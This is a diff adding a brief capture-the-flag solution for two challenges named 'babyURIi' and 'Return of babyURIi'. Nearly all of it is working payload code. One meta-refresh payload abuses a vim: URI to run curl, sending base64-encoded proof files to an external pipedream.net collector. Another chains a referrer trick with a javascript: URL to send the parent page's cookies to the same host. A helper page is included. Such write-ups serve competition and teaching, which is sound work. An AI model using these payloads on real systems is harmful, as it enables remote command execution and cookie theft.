@@ -1,0 +1,22 @@
+babyURIi:
+
+```
+<meta http-equiv=refresh content="0;url=vim:-c!curl%20https://ennt804r9ewb72x.m.pipedream.net/$(cat%20/proof_*.sh|base64)"></iframe>
+```
+
+Return of babyURIi:
+The payload depends on the length of the challenge's domain name:
+`path = document.referrer.substr(location.origin.length);`
+
+In local test environment, it is http://172.17.0.1:8083
+It will be easier and less costly for the participants if the challenge's domain name is long
+
+payload page:
+```
+<meta http-equiv=refresh content="0;url=https://2048.pub/asd?javascript:location=`https://ennt804r9ewb72x.m.pipedream.net/?z${parent.document.cookie}`">
+```
+
+https://2048.pub/asd:
+```
+<meta name="referrer" content="unsafe-url"><script>location="http://172.17.0.1:8083/report#p"</script>
+```
